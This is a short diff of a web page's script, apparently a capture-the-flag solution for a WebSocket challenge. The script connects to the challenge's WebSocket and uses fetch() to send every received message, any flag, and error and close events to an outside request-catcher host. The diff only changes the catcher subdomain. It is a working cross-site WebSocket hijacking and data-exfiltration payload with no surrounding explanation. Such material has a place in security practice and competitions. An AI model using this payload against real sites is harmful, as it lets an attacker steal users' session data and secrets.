@@ -10,7 +10,7 @@
   <script>
 
     // fetch('http://server.dottak.me')
-    // fetch('https://kyppjti.request.dreamhack.games')
+    // fetch('https://jhzwstm.request.dreamhack.games')
 
     const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
     // ws.onopen = function () {
@@ -28,20 +28,20 @@
 
     ws.onmessage = function (event) {
       const data = JSON.parse(event.data);
-      fetch('https://kyppjti.request.dreamhack.games/log?data=' + data.message)
+      fetch('https://jhzwstm.request.dreamhack.games/log?data=' + data.message)
 
       if (data.message.includes('Flag:')) {
         const flag = data.message;
-        fetch('https://kyppjti.request.dreamhack.games/flag?data=' + flag)
+        fetch('https://jhzwstm.request.dreamhack.games/flag?data=' + flag)
       }
     };
 
     ws.onerror = function (error) {
-      fetch('https://kyppjti.request.dreamhack.games/error?error=' + error)
+      fetch('https://jhzwstm.request.dreamhack.games/error?error=' + error)
     };
 
     ws.onclose = function () {
-      fetch('https://kyppjti.request.dreamhack.games/close')
+      fetch('https://jhzwstm.request.dreamhack.games/close')
     };
 
     // ws.addEventListener('open', () => {
